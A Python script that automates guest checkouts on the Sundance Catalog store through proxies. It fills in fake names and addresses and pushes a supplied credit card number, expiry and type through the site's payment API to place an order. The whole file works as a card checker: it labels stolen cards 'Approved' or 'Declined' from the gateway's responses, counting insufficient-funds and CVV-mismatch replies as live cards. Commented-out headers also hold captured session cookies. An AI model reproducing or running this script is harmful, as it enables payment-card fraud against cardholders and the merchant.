import aiohttp, uuid, traceback


async def chase2(cc, mes, ano, cvv, proxy):
    email = str(uuid.uuid4())[:8] + "@gmail.com"
    async with aiohttp.ClientSession() as session:
        captcha = None
        autori = None
        street='New York'
        state1='New York'
        state='NY'
        zipcode="10080"
        try:

            headers = {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                "accept-language": "es-419,es;q=0.8",
                "priority": "u=0, i",
                "sec-ch-ua": '"Not)A;Brand";v="99", "Brave";v="127", "Chromium";v="127"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "none",
                "sec-fetch-user": "?1",
                "sec-gpc": "1",
                "upgrade-insecure-requests": "1",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
            }

            response = await session.get(
                "https://www.sundancecatalog.com/product/41498", headers=headers,proxy=proxy
            )
            r1 = await response.text()

            headers = {
                "accept": "application/json",
                "accept-language": "es-419,es;q=0.8",
                "content-type": "application/json",
                "origin": "https://www.sundancecatalog.com",
                "priority": "u=1, i",
                "referer": "https://www.sundancecatalog.com/product/41498",
                "sec-ch-ua": '"Not)A;Brand";v="99", "Brave";v="127", "Chromium";v="127"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "sec-gpc": "1",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
                "x-vol-catalog": "1",
                "x-vol-currency": "USD",
                "x-vol-locale": "en-US",
                "x-vol-master-catalog": "1",
                "x-vol-site": "54665",
                "x-vol-tenant": "33306",
            }

            json_data = {
                "product": {
                    "productCode": "81464",
                    "variationProductCode": "003332364",
                    "options": [
                        {
                            "attributeFQN": "tenant~color",
                            "name": "Color",
                            "value": "C_BTRS",
                        },
                    ],
                },
                "quantity": 1,
                "fulfillmentMethod": "Ship",
                "parentItemId": None,
                "subscription": None,
            }

            response = await session.post(
                "https://www.sundancecatalog.com/api/commerce/carts/current/items/",
                headers=headers,
                json=json_data,proxy=proxy
            )
            r2 = await response.text()

            headers = {
                "accept": "*/*",
                "accept-language": "es-419,es;q=0.8",
                "referer": "https://www.sundancecatalog.com/product/81464",
                "sec-gpc": "1",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
                "x-requested-with": "XMLHttpRequest",
            }

            response = await session.get(
                "https://www.sundancecatalog.com/logout?saveUserId=true&returnUrl=/cart/checkout",
                headers=headers,proxy=proxy
            )
            r3 = await response.text()

            urle = r3.split('var PageContextURL = "')[1].split('"')[0]
            ides = urle.split("checkoutv2/")[1]

            response = await session.get(url=urle,proxy=proxy)
            r4 = await response.text()

            userid = r4.split('"updateBy":"')[1].split('"')[0]
            itemid = r4.split('"items":[{"id":"')[1].split('"')[0]

            headers = {
                "accept": "application/json",
                "accept-language": "es-419,es;q=0.8",
                "content-type": "application/json",
                "origin": "https://www.sundancecatalog.com",
                "referer": f"https://www.sundancecatalog.com/checkoutv2/{ides}",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
                "x-vol-catalog": "1",
                "x-vol-currency": "USD",
                "x-vol-locale": "en-US",
                "x-vol-master-catalog": "1",
                "x-vol-site": "54665",
                "x-vol-tenant": "33306",
            }

            json_data = {
                "receiverVersion": 2,
                "address": {
                    "candidateValidatedAddresses": None,
                    "countryCode": "US",
                    "addressType": "Residential",
                    "address1": street,
                    "cityOrTown": state1,
                    "stateOrProvince": state,
                    "postalOrZipCode": zipcode,
                },
                "candidateValidatedAddresses": None,
                "countryCode": "US",
                "addressType": "Residential",
                "address1": street,
                "cityOrTown": state1,
                "stateOrProvince": state,
                "postalOrZipCode": zipcode,
            }

            response = await session.post(
                "https://www.sundancecatalog.com/api/commerce/customer/addressvalidation/",
                headers=headers,
                json=json_data,proxy=proxy
            )
            r5 = await response.text()

            headers = {
                "accept": "application/json",
                "accept-language": "es-419,es;q=0.8",
                "content-type": "application/json",
                "origin": "https://www.sundancecatalog.com",
                "referer": f"https://www.sundancecatalog.com/checkoutv2/{ides}",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
                "x-vol-catalog": "1",
                "x-vol-currency": "USD",
                "x-vol-locale": "en-US",
                "x-vol-master-catalog": "1",
                "x-vol-site": "54665",
                "x-vol-tenant": "33306",
            }

            json_data = {
                "DestinationContact": {
                    "userId": userid,
                    "address": {
                        "candidateValidatedAddresses": [
                            {
                                "address1": "769 NEW YORK STREET FL 4",
                                "address2": "",
                                "cityOrTown": "NEW YORK",
                                "stateOrProvince": state,
                                "postalOrZipCode": "10080-0001",
                                "countryCode": "US",
                                "addressType": "Residential",
                                "isValidated": True,
                            },
                        ],
                        "countryCode": "US",
                        "addressType": "Residential",
                        "address1": street,
                        "cityOrTown": state1,
                        "stateOrProvince": state,
                        "postalOrZipCode": zipcode,
                    },
                    "firstName": "Alex",
                    "lastNameOrSurname": "Varela",
                    "phoneNumbers": {
                        "home": "951-357-3866",
                    },
                },
            }

            response = await session.post(
                f"https://www.sundancecatalog.com/api/commerce/checkouts/{ides}/destinations",
                headers=headers,
                json=json_data,proxy=proxy
            )
            r6 = await response.text()

            idaddres = r6.split('{"id":"')[1].split('"')[0]

            headers = {
                "accept": "application/json",
                "accept-language": "es-419,es;q=0.8",
                "content-type": "application/json",
                "origin": "https://www.sundancecatalog.com",
                "referer": f"https://www.sundancecatalog.com/checkoutv2/{ides}",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
                "x-vol-catalog": "1",
                "x-vol-currency": "USD",
                "x-vol-locale": "en-US",
                "x-vol-master-catalog": "1",
                "x-vol-site": "54665",
                "x-vol-tenant": "33306",
            }

            json_data = [
                {
                    "destinationId": idaddres,
                    "itemIds": [
                        itemid,
                    ],
                },
            ]

            response = await session.post(
                f"https://www.sundancecatalog.com/api/commerce/checkouts/{ides}/items/destinations",
                headers=headers,
                json=json_data,proxy=proxy
            )
            r7 = await response.text()

            headers = {
                "accept": "application/json",
                "accept-language": "es-419,es;q=0.8",
                "content-type": "application/json",
                "referer": f"https://www.sundancecatalog.com/checkoutv2/{ides}",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
                "x-vol-catalog": "1",
                "x-vol-currency": "USD",
                "x-vol-locale": "en-US",
                "x-vol-master-catalog": "1",
                "x-vol-site": "54665",
                "x-vol-tenant": "33306",
            }

            response = await session.get(
                f"https://www.sundancecatalog.com/api/commerce/checkouts/{ides}/shippingMethods",
                headers=headers,proxy=proxy
            )
            r8 = await response.text()

            groupid = r8.split('"groupingId":"')[1].split('"')[0]

            headers = {
                "accept": "application/json",
                "accept-language": "es-419,es;q=0.8",
                "content-type": "application/json",
                "origin": "https://www.sundancecatalog.com",
                "referer": f"https://www.sundancecatalog.com/checkoutv2/{ides}",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
                "x-vol-catalog": "1",
                "x-vol-currency": "USD",
                "x-vol-locale": "en-US",
                "x-vol-master-catalog": "1",
                "x-vol-site": "54665",
                "x-vol-tenant": "33306",
            }

            json_data = [
                {
                    "groupingId": groupid,
                    "shippingRate": {
                        "shippingMethodCode": "88",
                        "shippingMethodName": "Standard Jewelry",
                        "shippingZoneCode": "United States",
                        "isValid": True,
                        "messages": [],
                        "price": 9.95,
                    },
                },
            ]

            response = await session.post(
                f"https://www.sundancecatalog.com/api/commerce/checkouts/{ides}/shippingMethods",
                headers=headers,
                json=json_data,proxy=proxy
            )
            r9 = await response.text()

            headers = {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                "accept-language": "es-419,es;q=0.8",
                "referer": "https://www.sundancecatalog.com/",
                "upgrade-insecure-requests": "1",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
            }

            params = {
                "parenturl": f"https://www.sundancecatalog.com/checkoutv2/{ides}",
                "parentdomain": "https://www.sundancecatalog.com",
                "messagedelimiter": "|||||",
                "uid": "xhr_1",
            }

            response = await session.get(
                "https://pmts.mozu.com/payments/Assets/mozu_receiver_v2.html",
                params=params,
                headers=headers,proxy=proxy
            )
            r10 = await response.text()

            one = cc[0:1]
            cvvxd = "***"
            if one == "4":
                cc_type = "VISA"
            elif one == "5":
                cc_type = "MC"
            elif one == "3":
                cvvxd = "****"
                cc_type = "AMEX"
            elif one == "6":
                cc_type = "DISCOVER"

            headers = {
                "accept": "application/json",
                "accept-language": "es-419,es;q=0.8",
                "content-type": "application/json",
                "origin": "https://pmts.mozu.com",
                "referer": f"https://pmts.mozu.com/payments/Assets/mozu_receiver_v2.html?parenturl=https%3A%2F%2Fwww.sundancecatalog.com%2Fcheckoutv2%2F{ides}&parentdomain=https%3A%2F%2Fwww.sundancecatalog.com&messagedelimiter=%7C%7C%7C%7C%7C&uid=xhr_1",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
                "x-vol-catalog": "1",
                "x-vol-currency": "USD",
                "x-vol-locale": "en-US",
                "x-vol-master-catalog": "1",
                "x-vol-site": "54665",
                "x-vol-tenant": "33306",
            }

            json_data = {
                "cardNumber": cc,
                "cardholderName": "dfg dg",
                "cardType": cc_type,
                "cvv": "",
            }

            response = await session.post(
                "https://pmts.mozu.com/payments/commerce/payments/cards/",
                headers=headers,
                json=json_data,proxy=proxy
            )
            r11 = await response.text()

            paymentid = r11.split('"id":"')[1].split('"')[0]
            numberPart = r11.split('"numberPart":"')[1].split('"')[0]

            headers = {
                "accept": "application/json",
                "accept-language": "es-419,es;q=0.8",
                "content-type": "application/json",
                # 'cookie': '_mzvr=isz3P66z50-l2A-ASMEwSQ; _mzvs=nn; clarip_gpc=true; clarip_dns_cookie=1; BVImplmain_site=2012; recentProducts=%5B%7B%22code%22%3A%2241498%22%7D%5D; mozucart=%7B%22itemCount%22%3A1%2C%22totalQuantity%22%3A1%2C%22total%22%3A5%2C%22isExpired%22%3Afalse%2C%22hasActiveCart%22%3Atrue%7D; cartItemQty=1; guestEmail=pxfsdaa304%40gmail.com; user-email=pxfsdaa304@gmail.com; sb-sf-at-prod-s=at=K2q2D9mapo4IFRrF%2F3z1v%2BaL%2BU2%2FRD5WnojX%2FCJiZ26jvf31F6i2PgP30nNsODUJdAHV1KZINzdqRLrQFBBY67lX%2BEqcvhHME3mM8qnbk6%2FMHdQotRzley%2FDp9QSQMESh3OwdwcIJ1DXytoVKWg0VBi%2BdHKzv9tqtDZH5yW9v50ThCDGwtxBcD%2FHB0vpkF3nPqFZM1iPol2FxM1IQeKL6iZpQ%2FWSOzUXcH34JxzNDeieFtqQU%2B4I0p9WEquMocUM63emZyje6dFsfMuU0QU6Mc%2B79iqGFkxLai9%2FGjQQA7YN%2B7FC2TKqJtnfhBLtlc8uBM5vAeh8SvvWCUK3m%2BqwHyDirvj97RYJ6V1WV1CxPzdvBYl%2F0M7cU867NvO4U0iwocHopCdswJKDMEHsamd9VA%3D%3D&dt=2024-08-11T20%3A54%3A57.4303302Z; sb-sf-at-prod=at=K2q2D9mapo4IFRrF%2F3z1v%2BaL%2BU2%2FRD5WnojX%2FCJiZ26jvf31F6i2PgP30nNsODUJdAHV1KZINzdqRLrQFBBY67lX%2BEqcvhHME3mM8qnbk6%2FMHdQotRzley%2FDp9QSQMESh3OwdwcIJ1DXytoVKWg0VBi%2BdHKzv9tqtDZH5yW9v50ThCDGwtxBcD%2FHB0vpkF3nPqFZM1iPol2FxM1IQeKL6iZpQ%2FWSOzUXcH34JxzNDeieFtqQU%2B4I0p9WEquMocUM63emZyje6dFsfMuU0QU6Mc%2B79iqGFkxLai9%2FGjQQA7YN%2B7FC2TKqJtnfhBLtlc8uBM5vAeh8SvvWCUK3m%2BqwHyDirvj97RYJ6V1WV1CxPzdvBYl%2F0M7cU867NvO4U0iwocHopCdswJKDMEHsamd9VA%3D%3D; isAcceptsMarketing=true; cartItems=[{"product_availability":"out of stock","product_code":"41498","product_name":"Polishing Cloth For Jewelry","product_category_1":"Jewelry","product_category_2":"Jewelry Storage","product_category_3":"AllProds","product_brand":"","product_price":5,"product_quantity":1,"product_variant":"9999","product_discount":"","product_coupon":"","product_merchandising":""}]; __cf_bm=Ai92VqJHrvO7aQl7vL_H2xl5VD_GasTpHczGZA9NFhk-1723410529-1.0.1.1-gvb00RVMcoHU6QZ__lvvOcHcoF0BgEPfROk5Y59lC1LCAET6IH_lOBUQyE0dDN6a6avYQieF5gzMQLMsB6gGQA; AMCVS_43D827E253DB462E0A490D4E%40AdobeOrg=1; AMCV_43D827E253DB462E0A490D4E%40AdobeOrg=179643557%7CMCIDTS%7C19947%7CMCMID%7C83913588697742431517158250978932400530%7CMCOPTOUT-1723417732s%7CNONE%7CvVersion%7C5.5.0; _mzvt=PRMr2jC1QEK14oFOs5EuBA; _mzPc=eyJjb3JyZWxhdGlvbklkIjoiMGE2NGQ1OTk5NTM3NGZkZGEwNDYxNWIwMjY5YzYxNDciLCJpcEFkZHJlc3MiOiIxOTAuMTA4Ljk1LjI1MSIsImlzRGVidWdNb2RlIjpmYWxzZSwiaXNDcmF3bGVyIjpmYWxzZSwiaXNNb2JpbGUiOmZhbHNlLCJpc1RhYmxldCI6ZmFsc2UsImlzRGVza3RvcCI6dHJ1ZSwidXNlciI6eyJpc0F1dGhlbnRpY2F0ZWQiOmZhbHNlLCJ1c2VySWQiOiJiNmMyY2JlY2VkODQ0ODllOTJjYzFhYzQ2MzMzMTc5ZCIsImZpcnN0TmFtZSI6IiIsImxhc3ROYW1lIjoiIiwiZW1haWwiOiIiLCJpc0Fub255bW91cyI6dHJ1ZSwiYmVoYXZpb3JzIjpbMTAxNF0sImlzU2FsZXNSZXAiOmZhbHNlfSwidXNlclByb2ZpbGUiOnsidXNlcklkIjoiYjZjMmNiZWNlZDg0NDg5ZTkyY2MxYWM0NjMzMzE3OWQiLCJmaXJzdE5hbWUiOiIiLCJsYXN0TmFtZSI6IiIsImVtYWlsQWRkcmVzcyI6IiIsInVzZXJOYW1lIjoiIn0sImlzRWRpdE1vZGUiOmZhbHNlLCJpc0FkbWluTW9kZSI6ZmFsc2UsIm5vdyI6IjIwMjQtMDgtMTFUMjE6MDk6MTkuNjc4NDE5NVoiLCJjcmF3bGVySW5mbyI6eyJpc0NyYXdsZXIiOmZhbHNlfSwiY3VycmVuY3lSYXRlSW5mbyI6e319',
                "origin": "https://www.sundancecatalog.com",
                "priority": "u=1, i",
                "referer": f"https://www.sundancecatalog.com/checkoutv2/{ides}",
                "sec-ch-ua": '"Not)A;Brand";v="99", "Brave";v="127", "Chromium";v="127"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "sec-gpc": "1",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
                "x-vol-catalog": "1",
                "x-vol-currency": "USD",
                "x-vol-locale": "en-US",
                "x-vol-master-catalog": "1",
                "x-vol-site": "54665",
                "x-vol-tenant": "33306",
            }

            json_data = {
                "currencyCode": "USD",
                "amount": 15.39,
                "newBillingInfo": {
                    "billingContact": {
                        "userId": userid,
                        "email": email,
                        "address": {
                            "candidateValidatedAddresses": None,
                            "countryCode": "US",
                            "addressType": "Residential",
                            "stateOrProvince": state,
                            "address1": street,
                            "cityOrTown": state1,
                            "postalOrZipCode": zipcode,
                            "isValidated": False,
                        },
                        "firstName": "Alex",
                        "lastNameOrSurname": "Varela",
                        "phoneNumbers": {
                            "home": "951-357-3866",
                        },
                    },
                    "paymentWorkflow": "Mozu",
                    "check": {},
                    "card": {
                        "cardNumberPartOrMask": numberPart,
                        "cvv": cvvxd,
                        "nameOnCard": "dfg dg",
                        "paymentOrCardType": cc_type,
                        "paymentServiceCardId": paymentid,
                        "expireMonth": int(mes),
                        "expireYear": int(ano),
                    },
                    "purchaseOrder": {
                        "isEnabled": False,
                        "splitPayment": False,
                        "amount": 0,
                        "availableBalance": 0,
                        "creditLimit": 0,
                        "paymentTerm": {},
                    },
                    "boldPaymentStep": True,
                    "orderId": ides,
                    "paymentType": "CreditCard",
                    "card_Number": cc,
                    "isSameBillingShippingAddress": True,
                    "addressFromPaymentEdit": False,
                },
            }

            response = await session.post(
                f"https://www.sundancecatalog.com/api/commerce/checkouts/{ides}/payments/actions",
                headers=headers,
                json=json_data,proxy=proxy
            )
            r12 = await response.text()

            headers = {
                "accept": "application/json",
                "accept-language": "es-419,es;q=0.8",
                "content-type": "application/json",
                "origin": "https://www.sundancecatalog.com",
                "referer": f"https://www.sundancecatalog.com/checkoutv2/{ides}",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
                "x-vol-catalog": "1",
                "x-vol-currency": "USD",
                "x-vol-locale": "en-US",
                "x-vol-master-catalog": "1",
                "x-vol-site": "54665",
                "x-vol-tenant": "33306",
            }

            json_data = {
                "email": email,
                "acceptsMarketing": True,
                "data": {
                    "estimatedShipping": 0,
                },
            }

            response = await session.post(
                f"https://www.sundancecatalog.com/api/commerce/checkouts/{ides}",
                headers=headers,
                json=json_data,proxy=proxy
            )
            r13 = await response.text()

            headers = {
                "accept": "application/json",
                "accept-language": "es-419,es;q=0.8",
                "content-type": "application/json",
                # 'cookie': '_mzvr=isz3P66z50-l2A-ASMEwSQ; _mzvs=nn; clarip_gpc=true; clarip_dns_cookie=1; BVImplmain_site=2012; recentProducts=%5B%7B%22code%22%3A%2241498%22%7D%5D; mozucart=%7B%22itemCount%22%3A1%2C%22totalQuantity%22%3A1%2C%22total%22%3A5%2C%22isExpired%22%3Afalse%2C%22hasActiveCart%22%3Atrue%7D; cartItemQty=1; guestEmail=pxfsdaa304%40gmail.com; user-email=pxfsdaa304@gmail.com; sb-sf-at-prod-s=at=K2q2D9mapo4IFRrF%2F3z1v%2BaL%2BU2%2FRD5WnojX%2FCJiZ26jvf31F6i2PgP30nNsODUJdAHV1KZINzdqRLrQFBBY67lX%2BEqcvhHME3mM8qnbk6%2FMHdQotRzley%2FDp9QSQMESh3OwdwcIJ1DXytoVKWg0VBi%2BdHKzv9tqtDZH5yW9v50ThCDGwtxBcD%2FHB0vpkF3nPqFZM1iPol2FxM1IQeKL6iZpQ%2FWSOzUXcH34JxzNDeieFtqQU%2B4I0p9WEquMocUM63emZyje6dFsfMuU0QU6Mc%2B79iqGFkxLai9%2FGjQQA7YN%2B7FC2TKqJtnfhBLtlc8uBM5vAeh8SvvWCUK3m%2BqwHyDirvj97RYJ6V1WV1CxPzdvBYl%2F0M7cU867NvO4U0iwocHopCdswJKDMEHsamd9VA%3D%3D&dt=2024-08-11T20%3A54%3A57.4303302Z; sb-sf-at-prod=at=K2q2D9mapo4IFRrF%2F3z1v%2BaL%2BU2%2FRD5WnojX%2FCJiZ26jvf31F6i2PgP30nNsODUJdAHV1KZINzdqRLrQFBBY67lX%2BEqcvhHME3mM8qnbk6%2FMHdQotRzley%2FDp9QSQMESh3OwdwcIJ1DXytoVKWg0VBi%2BdHKzv9tqtDZH5yW9v50ThCDGwtxBcD%2FHB0vpkF3nPqFZM1iPol2FxM1IQeKL6iZpQ%2FWSOzUXcH34JxzNDeieFtqQU%2B4I0p9WEquMocUM63emZyje6dFsfMuU0QU6Mc%2B79iqGFkxLai9%2FGjQQA7YN%2B7FC2TKqJtnfhBLtlc8uBM5vAeh8SvvWCUK3m%2BqwHyDirvj97RYJ6V1WV1CxPzdvBYl%2F0M7cU867NvO4U0iwocHopCdswJKDMEHsamd9VA%3D%3D; __cf_bm=Ai92VqJHrvO7aQl7vL_H2xl5VD_GasTpHczGZA9NFhk-1723410529-1.0.1.1-gvb00RVMcoHU6QZ__lvvOcHcoF0BgEPfROk5Y59lC1LCAET6IH_lOBUQyE0dDN6a6avYQieF5gzMQLMsB6gGQA; AMCVS_43D827E253DB462E0A490D4E%40AdobeOrg=1; AMCV_43D827E253DB462E0A490D4E%40AdobeOrg=179643557%7CMCIDTS%7C19947%7CMCMID%7C83913588697742431517158250978932400530%7CMCOPTOUT-1723417732s%7CNONE%7CvVersion%7C5.5.0; _mzvt=PRMr2jC1QEK14oFOs5EuBA; _mzPc=eyJjb3JyZWxhdGlvbklkIjoiMGE2NGQ1OTk5NTM3NGZkZGEwNDYxNWIwMjY5YzYxNDciLCJpcEFkZHJlc3MiOiIxOTAuMTA4Ljk1LjI1MSIsImlzRGVidWdNb2RlIjpmYWxzZSwiaXNDcmF3bGVyIjpmYWxzZSwiaXNNb2JpbGUiOmZhbHNlLCJpc1RhYmxldCI6ZmFsc2UsImlzRGVza3RvcCI6dHJ1ZSwidXNlciI6eyJpc0F1dGhlbnRpY2F0ZWQiOmZhbHNlLCJ1c2VySWQiOiJiNmMyY2JlY2VkODQ0ODllOTJjYzFhYzQ2MzMzMTc5ZCIsImZpcnN0TmFtZSI6IiIsImxhc3ROYW1lIjoiIiwiZW1haWwiOiIiLCJpc0Fub255bW91cyI6dHJ1ZSwiYmVoYXZpb3JzIjpbMTAxNF0sImlzU2FsZXNSZXAiOmZhbHNlfSwidXNlclByb2ZpbGUiOnsidXNlcklkIjoiYjZjMmNiZWNlZDg0NDg5ZTkyY2MxYWM0NjMzMzE3OWQiLCJmaXJzdE5hbWUiOiIiLCJsYXN0TmFtZSI6IiIsImVtYWlsQWRkcmVzcyI6IiIsInVzZXJOYW1lIjoiIn0sImlzRWRpdE1vZGUiOmZhbHNlLCJpc0FkbWluTW9kZSI6ZmFsc2UsIm5vdyI6IjIwMjQtMDgtMTFUMjE6MDk6MTkuNjc4NDE5NVoiLCJjcmF3bGVySW5mbyI6eyJpc0NyYXdsZXIiOmZhbHNlfSwiY3VycmVuY3lSYXRlSW5mbyI6e319',
                "origin": "https://www.sundancecatalog.com",
                "priority": "u=1, i",
                "referer": f"https://www.sundancecatalog.com/checkoutv2/{ides}",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
                "x-vol-catalog": "1",
                "x-vol-currency": "USD",
                "x-vol-locale": "en-US",
                "x-vol-master-catalog": "1",
                "x-vol-site": "54665",
                "x-vol-tenant": "33306",
            }

            json_data = {
                "actionName": "SubmitCheckout",
            }

            response = await session.post(
                f"https://www.sundancecatalog.com/api/commerce/checkouts/{ides}/actions",
                headers=headers,
                json=json_data,proxy=proxy
            )
            r14 = await response.text()
            if '"status":"Authorized"' in r14:
                status = "Approved ✅"
                mensaje = "Charged 8$!"

            else:
                mensaje = r14.split("GatewayResponse: ")[1].split('"')[0]

                if "CVV2" in mensaje:
                    status = "Approved ✅"
                elif "Credit Floor" in mensaje or "Funds" in mensaje:
                    status = "Approved ✅"
                elif "C4 Over Limit" in mensaje:
                    status = "Approved ✅"
                else:
                    status = "Declined ❌"
            return status, mensaje

        except Exception as e:
            linea = str(e.__traceback__.tb_lineno)
            print("Error en la linea: " + linea + " " + str(e))
            status = "Error ⚠️"
            traceback_str = traceback.format_exc()
            mensaje = f"{e} | {traceback_str}"
            
